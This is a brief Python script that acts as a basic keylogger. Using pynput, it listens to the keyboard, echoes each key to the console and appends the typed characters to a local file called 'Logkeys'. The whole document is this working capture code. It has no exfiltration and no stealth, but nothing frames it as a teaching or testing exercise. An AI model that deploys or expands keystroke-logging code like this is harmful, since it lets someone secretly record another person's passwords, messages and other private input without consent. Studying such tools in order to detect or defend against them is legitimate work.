from pynput import keyboard, mouse

def keyPressed(key):
    print(str(key));
    with open("Logkeys", "a") as logKey:
        try:
            char = key.char
            logKey.write(char);
        except:
            pass

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed);
    listener.start();
    input();

